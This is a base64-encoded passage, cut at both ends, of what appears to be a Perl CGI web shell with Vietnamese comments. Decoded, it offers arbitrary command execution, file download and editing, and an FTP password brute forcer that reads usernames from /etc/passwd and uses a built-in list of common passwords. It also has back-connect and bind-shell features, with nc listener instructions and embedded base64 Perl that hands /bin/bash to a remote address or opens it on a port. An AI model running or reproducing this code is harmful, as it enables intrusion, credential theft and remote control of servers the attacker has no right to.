ZmlsZS4gSWYgdGhlCiMgZmlsZW5hbWUgaXMgbm90IHNwZWNpZmllZCwgaXQgZGlzcGxheXMgYSBmb3JtIGFsbG93aW5nIHRoZSB1c2VyIHRvIHNwZWNpZnkgYQojIGZpbGUsIG90aGVyd2lzZSBpdCBkaXNwbGF5cyBhIG1lc3NhZ2UgdG8gdGhlIHVzZXIgYW5kIHByb3ZpZGVzIGEgbGluawojIHRocm91Z2ggIHdoaWNoIHRoZSBmaWxlIGNhbiBiZSBkb3dubG9hZGVkLgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBEb3dubG9hZEZpbGUKewoJIyBpZiBubyBmaWxlIGlzIHNwZWNpZmllZCwgcHJpbnQgdGhlIGRvd25sb2FkIGZvcm0gYWdhaW4KCWlmKCRUcmFuc2ZlckZpbGUgZXEgIiIpCgl7CgkJJlByaW50UGFnZUhlYWRlcigiZiIpOwoJCXJldHVybiAmUHJpbnRGaWxlRG93bmxvYWRGb3JtOwoJfQoJCgkjIGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkCglpZigoJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXFx8Xi46LykpIHwgKCEkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cLy8pKSkgIyBwYXRoIGlzIGFic29sdXRlCgl7CgkJJFRhcmdldEZpbGUgPSAkVHJhbnNmZXJGaWxlOwoJfQoJZWxzZSAjIHBhdGggaXMgcmVsYXRpdmUKCXsKCQljaG9wKCRUYXJnZXRGaWxlKSBpZigkVGFyZ2V0RmlsZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOwoJCSRUYXJnZXRGaWxlIC49ICRQYXRoU2VwLiRUcmFuc2ZlckZpbGU7Cgl9CgoJaWYoJE9wdGlvbnMgZXEgImdvIikgIyB3ZSBoYXZlIHRvIHNlbmQgdGhlIGZpbGUKCXsKCQlyZXR1cm4gJlNlbmRGaWxlVG9Ccm93c2VyKCRUYXJnZXRGaWxlKTsKCX0KCWVsc2UgIyB3ZSBoYXZlIHRvIHNlbmQgb25seSB0aGUgbGluayBwYWdlCgl7CgkJcmV0dXJuICZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOwoJfQp9CgoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHRvIGV4ZWN1dGUgY29tbWFuZHMuIEl0IGRpc3BsYXlzIHRoZSBvdXRwdXQgb2YgdGhlCiMgY29tbWFuZCBhbmQgYWxsb3dzIHRoZSB1c2VyIHRvIGVudGVyIGFub3RoZXIgY29tbWFuZC4gVGhlIGNoYW5nZSBkaXJlY3RvcnkKIyBjb21tYW5kIGlzIGhhbmRsZWQgZGlmZmVyZW50bHkuIEluIHRoaXMgY2FzZSwgdGhlIG5ldyBkaXJlY3RvcnkgaXMgc3RvcmVkIGluCiMgYW4gaW50ZXJuYWwgdmFyaWFibGUgYW5kIGlzIHVzZWQgZWFjaCB0aW1lIGEgY29tbWFuZCBoYXMgdG8gYmUgZXhlY3V0ZWQuIFRoZQojIG91dHB1dCBvZiB0aGUgY2hhbmdlIGRpcmVjdG9yeSBjb21tYW5kIGlzIG5vdCBkaXNwbGF5ZWQgdG8gdGhlIHVzZXJzCiMgdGhlcmVmb3JlIGVycm9yIG1lc3NhZ2VzIGNhbm5vdCBiZSBkaXNwbGF5ZWQuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIEV4ZWN1dGVDb21tYW5kCnsKCW15ICRyZXN1bHQ9IiI7CglpZigkUnVuQ29tbWFuZCA9fiBtL15ccypjZFxzKyguKykvKSAjIGl0IGlzIGEgY2hhbmdlIGRpciBjb21tYW5kCgl7CgkJIyB3ZSBjaGFuZ2UgdGhlIGRpcmVjdG9yeSBpbnRlcm5hbGx5LiBUaGUgb3V0cHV0IG9mIHRoZQoJCSMgY29tbWFuZCBpcyBub3QgZGlzcGxheWVkLgoJCSRDb21tYW5kID0gImNkIFwiJEN1cnJlbnREaXJcIiIuJENtZFNlcC4iY2QgJDEiLiRDbWRTZXAuJENtZFB3ZDsKCQljaG9wKCRDdXJyZW50RGlyID0gYCRDb21tYW5kYCk7CgkJJHJlc3VsdCAuPSAmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsKCgkJJHJlc3VsdCAuPSAiQ29tbWFuZDogPHJ1bj4kUnVuQ29tbWFuZCA8L3J1bj48YnI+PHRleHRhcmVhIGNvbHM9JyRjb2xzJyByb3dzPSckcm93cycgc3BlbGxjaGVjaz0nZmFsc2UnPiI7CgkJIyB4dWF0IHRob25nIHRpbiBraGkgY2h1eWVuIGRlbiAxIHRodSBtdWMgbmFvIGRvIQoJCSRSdW5Db21tYW5kPSAkV2luTlQ/ImRpciI6ImRpciAtbGlhIjsKCQkkcmVzdWx0IC49ICZSdW5DbWQ7Cgl9ZWxzaWYoJFJ1bkNvbW1hbmQgPX4gbS9eXHMqZWRpdFxzKyguKykvKQoJewoJCSRyZXN1bHQgLj0gICZTYXZlRmlsZUZvcm07Cgl9ZWxzZQoJewoJCSRyZXN1bHQgLj0gJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07CgkJJHJlc3VsdCAuPSAiQ29tbWFuZDogPHJ1bj4kUnVuQ29tbWFuZDwvcnVuPjxicj48dGV4dGFyZWEgaWQ9J2RhdGEnIGNvbHM9JyRjb2xzJyByb3dzPSckcm93cycgc3BlbGxjaGVjaz0nZmFsc2UnPiI7CgkJJHJlc3VsdCAuPSZSdW5DbWQ7Cgl9CgkkcmVzdWx0IC49ICAiPC90ZXh0YXJlYT4iOwoJcmV0dXJuICRyZXN1bHQ7Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBydW4gY29tbWFuZAojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgpzdWIgUnVuQ21kCnsKCW15ICRyZXN1bHQ9IiI7CgkkQ29tbWFuZCA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuJFJ1bkNvbW1hbmQuJFJlZGlyZWN0b3I7CglpZighJFdpbk5UKQoJewoJCSRTSUd7J0FMUk0nfSA9IFwmQ29tbWFuZFRpbWVvdXQ7CgkJYWxhcm0oJENvbW1hbmRUaW1lb3V0RHVyYXRpb24pOwoJfQoJaWYoJFNob3dEeW5hbWljT3V0cHV0KSAjIHNob3cgb3V0cHV0IGFzIGl0IGlzIGdlbmVyYXRlZAoJewoJCSR8PTE7CgkJJENvbW1hbmQgLj0gIiB8IjsKCQlvcGVuKENvbW1hbmRPdXRwdXQsICRDb21tYW5kKTsKCQl3aGlsZSg8Q29tbWFuZE91dHB1dD4pCgkJewoJCQkkXyA9fiBzLyhcbnxcclxuKSQvLzsKCQkJJHJlc3VsdCAuPSAmSHRtbFNwZWNpYWxDaGFycygiJF9cbiIpOwoJCX0KCQkkfD0wOwoJfQoJZWxzZSAjIHNob3cgb3V0cHV0IGFmdGVyIGNvbW1hbmQgY29tcGxldGVzCgl7CgkJJHJlc3VsdCAuPSAmSHRtbFNwZWNpYWxDaGFycygnJENvbW1hbmQnKTsKCX0KCWlmKCEkV2luTlQpCgl7CgkJYWxhcm0oMCk7Cgl9CglyZXR1cm4gJHJlc3VsdDsKfQojPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CiMgRm9ybSBTYXZlIEZpbGUgCiM9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0Kc3ViIFNhdmVGaWxlRm9ybQp7CglteSAkcmVzdWx0ID0iIjsKCXN1YnN0cigkUnVuQ29tbWFuZCwwLDUpPSIiOwoJbXkgJGZpbGU9JnRyaW0oJFJ1bkNvbW1hbmQpOwoJJHNhdmU9Jzxicj48aW5wdXQgbmFtZT0iYSIgdHlwZT0ic3VibWl0IiB2YWx1ZT0ic2F2ZSIgY2xhc3M9InN1Ym1pdCIgPic7CgkkRmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4kUnVuQ29tbWFuZDsKCW15ICRkaXI9IjxzcGFuIHN0eWxlPSdmb250OiAxMXB0IFZlcmRhbmE7IGZvbnQtd2VpZ2h0OiBib2xkOyc+Ii4mQWRkTGlua0RpcigiZ3VpIikuIjwvc3Bhbj4iOwoJaWYoLXcgJEZpbGUpCgl7CgkJJHJvd3M9IjIzIgoJfWVsc2UKCXsKCQkkbXNnPSI8YnI+PGZvbnQgc3R5bGU9J2ZvbnQ6IDE1cHQgVmVyZGFuYTsgY29sb3I6IHllbGxvdzsnID4gUGVybWlzc2lvbiBkZW5pZWQhPGZvbnQ+PGJyPiI7CgkJJHJvd3M9IjIwIgoJfQoJJFByb21wdCA9ICRXaW5OVCA/ICIkZGlyID4gIiA6ICI8Zm9udCBjb2xvcj0nI0ZGRkZGRic+W2FkbWluXEAkU2VydmVyTmFtZSAkZGlyXVwkPC9mb250PiAiOwoJJHJlYWQ9KCRXaW5OVCk/InR5cGUiOiJsZXNzIjsKCSRSdW5Db21tYW5kID0gIiRyZWFkIFwiJFJ1bkNvbW1hbmRcIiI7CgkkcmVzdWx0IC49ICA8PEVORDsKCTxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPgoKCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+CgkkUHJvbXB0Cgk8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iNDAiIG5hbWU9ImMiPgoJPGlucHV0IG5hbWU9InMiIGNsYXNzPSJzdWJtaXQiIHR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4KCTxicj5Db21tYW5kOiA8cnVuPiAkUnVuQ29tbWFuZCA8L3J1bj4KCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImZpbGUiIHZhbHVlPSIkZmlsZSIgPiAkc2F2ZSA8YnI+ICRtc2cKCTxicj48dGV4dGFyZWEgaWQ9ImRhdGEiIG5hbWU9ImRhdGEiIGNvbHM9IiRjb2xzIiByb3dzPSIkcm93cyIgc3BlbGxjaGVjaz0iZmFsc2UiPgpFTkQKCQoJJHJlc3VsdCAuPSAmUnVuQ21kOwoJJHJlc3VsdCAuPSAgIjwvdGV4dGFyZWE+IjsKCSRyZXN1bHQgLj0gICI8L2Zvcm0+IjsKCXJldHVybiAkcmVzdWx0Owp9CiM9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KIyBTYXZlIEZpbGUKIz09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQpzdWIgU2F2ZUZpbGUoJCkKewoJbXkgJERhdGE9IHNoaWZ0IDsKCW15ICRGaWxlPSBzaGlmdDsKCSRGaWxlPSRDdXJyZW50RGlyLiRQYXRoU2VwLiRGaWxlOwoJaWYob3BlbihGSUxFLCAiPiRGaWxlIikpCgl7CgkJYmlubW9kZSBGSUxFOwoJCXByaW50IEZJTEUgJERhdGE7CgkJY2xvc2UgRklMRTsKCQlyZXR1cm4gMTsKCX1lbHNlCgl7CgkJcmV0dXJuIDA7Cgl9Cn0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIEJydXRlIEZvcmNlciBGb3JtCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIEJydXRlRm9yY2VyRm9ybQp7CglteSAkcmVzdWx0PSIiOwoJJHJlc3VsdCAuPSA8PEVORDsKCjx0YWJsZT4KCjx0cj4KPHRkIGNvbHNwYW49IjIiIGFsaWduPSJjZW50ZXIiPgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyM8YnI+ClNpbXBsZSBGVFAgYnJ1dGUgZm9yY2VyPGJyPgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+Cgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iYnJ1dGVmb3JjZXIiLz4KPC90ZD4KPC90cj4KPHRyPgo8dGQ+VXNlcjo8YnI+PHRleHRhcmVhIHJvd3M9IjE4IiBjb2xzPSIzMCIgbmFtZT0idXNlciI+CkVORApjaG9wKCRyZXN1bHQgLj0gYGxlc3MgL2V0Yy9wYXNzd2QgfCBjdXQgLWQ6IC1mMWApOwokcmVzdWx0IC49IDw8J0VORCc7CjwvdGV4dGFyZWE+PC90ZD4KPHRkPgoKUGFzczo8YnI+Cjx0ZXh0YXJlYSByb3dzPSIxOCIgY29scz0iMzAiIG5hbWU9InBhc3MiPjEyM3Bhc3MKMTIzIUAjCjEyM2FkbWluCjEyM2FiYwoxMjM0NTZhZG1pbgoxMjM0NTU0MzIxCjEyMzQ0MzIxCnBhc3MxMjMKYWRtaW4KYWRtaW5jcAphZG1pbmlzdHJhdG9yCm1hdGtoYXUKcGFzc2FkbWluCnBAc3N3b3JkCnBAc3N3MHJkCnBhc3N3b3JkCjEyMzQ1NgoxMjM0NTY3CjEyMzQ1Njc4CjEyMzQ1Njc4OQoxMjM0NTY3ODkwCjExMTExMQowMDAwMDAKMjIyMjIyCjMzMzMzMwo0NDQ0NDQKNTU1NTU1CjY2NjY2Ngo3Nzc3NzcKODg4ODg4Cjk5OTk5OQoxMjMxMjMKMjM0MjM0CjM0NTM0NQo0NTY0NTYKNTY3NTY3CjY3ODY3OAo3ODk3ODkKMTIzMzIxCjQ1NjY1NAo2NTQzMjEKNzY1NDMyMQo4NzY1NDMyMQo5ODc2NTQzMjEKMDk4NzY1NDMyMQphZG1pbjEyMwphZG1pbjEyMzQ1NgphYmNkZWYKYWJjYWJjCiFAIyFAIwohQCMkJV4KIUAjJCVeJiooCiFAIyQkI0AhCmFiYzEyMwphbmh5ZXVlbQppbG92ZXlvdTwvdGV4dGFyZWE+CjwvdGQ+CjwvdHI+Cjx0cj4KPHRkIGNvbHNwYW49IjIiIGFsaWduPSJjZW50ZXIiPgpTbGVlcDo8c2VsZWN0IG5hbWU9InNsZWVwIj4KCjxvcHRpb24+MDwvb3B0aW9uPgo8b3B0aW9uPjE8L29wdGlvbj4KPG9wdGlvbj4yPC9vcHRpb24+Cgo8b3B0aW9uPjM8L29wdGlvbj4KPC9zZWxlY3Q+IAo8aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0ic3VibWl0IiB2YWx1ZT0iQnJ1dGUgRm9yY2VyIi8+PC90ZD48L3RyPgo8L2Zvcm0+CjwvdGFibGU+CkVORApyZXR1cm4gJHJlc3VsdDsKfQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgQnJ1dGUgRm9yY2VyCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIEJydXRlRm9yY2VyCnsKCW15ICRyZXN1bHQ9IiI7CgkkU2VydmVyPSRFTlZ7J1NFUlZFUl9BRERSJ307CglpZigkaW57J3VzZXInfSBlcSAiIikKCXsKCQkkcmVzdWx0IC49ICZCcnV0ZUZvcmNlckZvcm07Cgl9ZWxzZQoJewoJCXVzZSBOZXQ6OkZUUDsgCgkJQHVzZXI9IHNwbGl0KC9cbi8sICRpbnsndXNlcid9KTsKCQlAcGFzcz0gc3BsaXQoL1xuLywgJGlueydwYXNzJ30pOwoJCWNob21wKEB1c2VyKTsKCQljaG9tcChAcGFzcyk7CgkJJHJlc3VsdCAuPSAiPGJyPjxicj5bK10gVHJ5aW5nIGJydXRlICRTZXJ2ZXJOYW1lPGJyPj09PT09PT09PT09PT09PT09PT09Pj4+Pj4+Pj4+Pj4+PDw8PDw8PDw8PD09PT09PT09PT09PT09PT09PT09PGJyPjxicj5cbiI7CgkJZm9yZWFjaCAkdXNlcm5hbWUgKEB1c2VyKQoJCXsKCQkJaWYoISgkdXNlcm5hbWUgZXEgIiIpKQoJCQl7CgkJCQlmb3JlYWNoICRwYXNzd29yZCAoQHBhc3MpCgkJCQl7CgkJCQkJJGZ0cCA9IE5ldDo6RlRQLT5uZXcoJFNlcnZlcikgb3IgZGllICJDb3VsZCBub3QgY29ubmVjdCB0byAkU2VydmVyTmFtZVxuIjsgCgkJCQkJaWYoJGZ0cC0+bG9naW4oIiR1c2VybmFtZSIsIiRwYXNzd29yZCIpKQoJCQkJCXsKCQkJCQkJJHJlc3VsdCAuPSAiPGEgdGFyZ2V0PSdfYmxhbmsnIGhyZWY9J2Z0cDovLyR1c2VybmFtZTokcGFzc3dvcmRcQCRTZXJ2ZXInPlsrXSBmdHA6Ly8kdXNlcm5hbWU6JHBhc3N3b3JkXEAkU2VydmVyPC9hPjxicj5cbiI7CgkJCQkJCSRmdHAtPnF1aXQoKTsKCQkJCQkJYnJlYWs7CgkJCQkJfQoJCQkJCWlmKCEoJGlueydzbGVlcCd9IGVxICIwIikpCgkJCQkJewoJCQkJCQlzbGVlcChpbnQoJGlueydzbGVlcCd9KSk7CgkJCQkJfQoJCQkJCSRmdHAtPnF1aXQoKTsKCQkJCX0KCQkJfQoJCX0KCQkkcmVzdWx0IC49ICJcbjxicj49PT09PT09PT09Pj4+Pj4+Pj4+PiBGaW5pc2hlZCA8PDw8PDw8PDw8PT09PT09PT09PTxicj5cbiI7Cgl9CglyZXR1cm4gJHJlc3VsdDsKfQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgQmFja2Nvbm5lY3QgRm9ybQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBCYWNrQmluZEZvcm0KewoJcmV0dXJuIDw8RU5EOwoJPGJyPjxicj4KCgk8dGFibGU+Cgk8dHI+Cgk8Zm9ybSBuYW1lPSJmIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4KCTx0ZD5CYWNrQ29ubmVjdDogPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImJhY2tiaW5kIj48L3RkPgoJPHRkPiBIb3N0OiA8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iMjAiIG5hbWU9ImNsaWVudGFkZHIiIHZhbHVlPSIkRU5WeydSRU1PVEVfQUREUid9Ij4KCSBQb3J0OiA8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iNyIgbmFtZT0iY2xpZW50cG9ydCIgdmFsdWU9IjgwIiBvbmtleXVwPSJkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYmEnKS5pbm5lckhUTUw9dGhpcy52YWx1ZTsiPjwvdGQ+CgoJPHRkPjxpbnB1dCBuYW1lPSJzIiBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIG5hbWU9InN1Ym1pdCIgdmFsdWU9IkNvbm5lY3QiPjwvdGQ+Cgk8L2Zvcm0+Cgk8L3RyPgoJPHRyPgoJPHRkIGNvbHNwYW49Mz48Zm9udCBjb2xvcj0jRkZGRkZGPlsrXSBDbGllbnQgbGlzdGVuIGJlZm9yZSBjb25uZWN0IGJhY2shCgk8YnI+WytdIFRyeSBjaGVjayB5b3VyIFBvcnQgd2l0aCA8YSB0YXJnZXQ9Il9ibGFuayIgaHJlZj0iaHR0cDovL3d3dy5jYW55b3VzZWVtZS5vcmcvIj5odHRwOi8vd3d3LmNhbnlvdXNlZW1lLm9yZy88L2E+Cgk8YnI+WytdIENsaWVudCBsaXN0ZW4gd2l0aCBjb21tYW5kOiA8cnVuPm5jIC12diAtbCAtcCA8c3BhbiBpZD0iYmEiPjgwPC9zcGFuPjwvcnVuPjwvZm9udD48L3RkPgoKCTwvdHI+Cgk8L3RhYmxlPgoKCTxicj48YnI+Cgk8dGFibGU+Cgk8dHI+Cgk8Zm9ybSBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4KCTx0ZD5CaW5kIFBvcnQ6IDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJiYWNrYmluZCI+PC90ZD4KCgk8dGQ+IFBvcnQ6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBzaXplPSIxNSIgbmFtZT0iY2xpZW50cG9ydCIgdmFsdWU9IjE0MTIiIG9ua2V5dXA9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdiaScpLmlubmVySFRNTD10aGlzLnZhbHVlOyI+CgoJIFBhc3N3b3JkOiA8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iMTUiIG5hbWU9ImJpbmRwYXNzIiB2YWx1ZT0iVEhJRVVHSUFCVU9OIj48L3RkPgoJPHRkPjxpbnB1dCBuYW1lPSJzIiBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIG5hbWU9InN1Ym1pdCIgdmFsdWU9IkJpbmQiPjwvdGQ+Cgk8L2Zvcm0+Cgk8L3RyPgoJPHRyPgoJPHRkIGNvbHNwYW49Mz48Zm9udCBjb2xvcj0jRkZGRkZGPlsrXSBDaHVjIG5hbmcgY2h1YSBkYyB0ZXN0IQoJPGJyPlsrXSBUcnkgY29tbWFuZDogPHJ1bj5uYyAkRU5WeydTRVJWRVJfQUREUid9IDxzcGFuIGlkPSJiaSI+MTQxMjwvc3Bhbj48L3J1bj48L2ZvbnQ+PC90ZD4KCgk8L3RyPgoJPC90YWJsZT48YnI+CkVORAp9CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBCYWNrY29ubmVjdCB1c2UgcGVybAojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBCYWNrQmluZAp7Cgl1c2UgTUlNRTo6QmFzZTY0OwoJdXNlIFNvY2tldDsJCgkkYmFja3Blcmw9Ikl5RXZkWE55TDJKcGJpOXdaWEpzRFFwMWMyVWdTVTg2T2xOdlkydGxkRHNOQ2lSVGFHVnNiQWs5SUNJdlltbHVMMkpoYzJnaU93MEtKRUZTUjBNOVFFRlNSMVk3RFFwMWMyVWdVMjlqYTJWME93MEtkWE5sSUVacGJHVklZVzVrYkdVN0RRcHpiMk5yWlhRb1UwOURTMFZVTENCUVJsOUpUa1ZVTENCVFQwTkxYMU5VVWtWQlRTd2daMlYwY0hKdmRHOWllVzVoYldVb0luUmpjQ0lwS1NCdmNpQmthV1VnY0hKcGJuUWdJbHN0WFNCVmJtRmliR1VnZEc4Z1VtVnpiMngyWlNCSWIzTjBYRzRpT3cwS1kyOXVibVZqZENoVFQwTkxSVlFzSUhOdlkydGhaR1J5WDJsdUtDUkJVa2RXV3pGZExDQnBibVYwWDJGMGIyNG9KRUZTUjFaYk1GMHBLU2tnYjNJZ1pHbGxJSEJ5YVc1MElDSmJMVjBnVlc1aFlteGxJSFJ2SUVOdmJtNWxZM1FnU0c5emRGeHVJanNOQ25CeWFXNTBJQ0pEYjI1dVpXTjBaV1FoSWpzTkNsTlBRMHRGVkMwK1lYVjBiMlpzZFhOb0tDazdEUXB2Y0dWdUtGTlVSRWxPTENBaVBpWlRUME5MUlZRaUtUc05DbTl3Wlc0b1UxUkVUMVZVTENJK0psTlBRMHRGVkNJcE93MEtiM0JsYmloVFZFUkZVbElzSWo0bVUwOURTMFZVSWlrN0RRcHdjbWx1ZENBaUxTMDlQU0JEYjI1dVpXTjBaV1FnUW1GamEyUnZiM0lnUFQwdExTQWdYRzVjYmlJN0RRcHplWE4wWlcwb0luVnVjMlYwSUVoSlUxUkdTVXhGT3lCMWJuTmxkQ0JUUVZaRlNFbFRWQ0E3WldOb2J5QW5XeXRkSUZONWMzUmxiV2x1Wm04NklDYzdJSFZ1WVcxbElDMWhPMlZqYUc4N1pXTm9ieUFuV3l0ZElGVnpaWEpwYm1adk9pQW5PeUJwWkR0bFkyaHZPMlZqYUc4Z0oxc3JYU0JFYVhKbFkzUnZjbms2SUNjN0lIQjNaRHRsWTJodk95QmxZMmh2SUNkYksxMGdVMmhsYkd3NklDYzdKRk5vWld4c0lpazdEUXBqYkc5elpTQlRUME5MUlZRNyI7CgkkYmluZHBlcmw9Ikl5RXZkWE55TDJKcGJpOXdaWEpzRFFwMWMyVWdVMjlqYTJWME93MEtKRUZTUjBNOVFFRlNSMVk3RFFva2NHOXlkQWs5SUNSQlVrZFdXekJkT3cwS0pIQnliM1J2Q1QwZ1oyVjBjSEp2ZEc5aWVXNWhiV1VvSjNSamNDY3BPdzBLSkZOb1pXeHNDVDBnSWk5aWFXNHZZbUZ6YUNJN0RRcHpiMk5yWlhRb1UwVlNWa1ZTTENCUVJsOUpUa1ZVTENCVFQwTkxYMU5VVWtWQlRTd2dKSEJ5YjNSdktXOXlJR1JwWlNBaWMyOWphMlYwT2lRaElqc05Dbk5sZEhOdlkydHZjSFFvVTBWU1ZrVlNMQ0JUVDB4ZlUwOURTMFZVTENCVFQxOVNSVlZUUlVGRVJGSXNJSEJoWTJzb0ltd2lMQ0F4S1NsdmNpQmthV1VnSW5ObGRITnZZMnR2Y0hRNklDUWhJanNOQ21KcGJtUW9VMFZTVmtWU0xDQnpiMk5yWVdSa2NsOXBiaWdrY0c5eWRDd2dTVTVCUkVSU1gwRk9XU2twYjNJZ1pHbGxJQ0ppYVc1a09pQWtJU0k3RFFwc2FYTjBaVzRvVTBWU1ZrVlNMQ0JUVDAxQldFTlBUazRwQ1FsdmNpQmthV1VnSW14cGMzUmxiam9nSkNFaU93MEtabTl5S0RzZ0pIQmhaR1J5SUQwZ1lXTmpaWEIwS0VOTVNVVk9WQ3dnVTBWU1ZrVlNLVHNnWTJ4dmMyVWdRMHhKUlU1VUtRMEtldzBLQ1c5d1pXNG9VMVJFU1U0c0lDSStKa05NU1VWT1ZDSXBPdzBLQ1c5d1pXNG9VMVJFVDFWVUxDQWlQaVpEVEVsRlRsUWlLVHNOQ2dsdmNHVnVLRk5VUkVWU1Vpd2dJajRtUTB4SlJVNVVJaWs3RFFvSmMzbHpkR1Z0S0NKMWJuTmxkQ0JJU1ZOVVJrbE1SVHNnZFc1elpYUWdVMEZXUlVoSlUxUWdPMlZqYUc4Z0oxc3JYU0JUZVhOMFpXMXBibVp2T2lBbk95QjFibUZ0WlNBdFlUdGxZMmh2TzJWamFHOGdKMXNyWFNCVmMyVnlhVzVtYnpvZ0p6c2dhV1E3WldOb2J6dGxZMmh2SUNkYksxMGdSR2x5WldOMGIzSjVPaUFuT3lCd2QyUTdaV05vYnpzZ1pXTm9ieUFuV3l0ZElGTm9aV3hzT2lBbk95UlRhR1ZzYkNJcE93MEtDV05zYjNObEtGTlVSRWxPS1RzTkNnbGpiRzl6WlNoVFZFUlBWVlFwT3cwS0NXTnNiM05sS0ZOVVJFVlNVaWs3RFFwOURRbz0iOwoKCSRDbGllbnRBZGRyID0gJGlueydjbGllbnRhZGRyJ307CgkkQ2xpZW50UG9ydCA9IGludCgkaW57J2NsaWVudHBvcnQnfSk7CglpZigkQ2xpZW50UG9ydCBlcSAwKQoJewoJCXJldHVybiAmQmFja0JpbmRGb3JtOwoJfWVsc2lmKCEkQ2xpZW50QWRkciBlcSAiIikKCXsKCQkkRGF0YT1kZWNvZGVfYmFzZTY0KCRiYWNrcGVybCk7CgkJaWYoLXcgIi90bXAvIikKCQl7CgkJCSRGaWxlPSIvdG1wL2JhY2tjb25uZWN0LnBsIjsJCgkJfWVsc2UKCQl7CgkJCSRGaWxlPSRDdXJyZW50RGl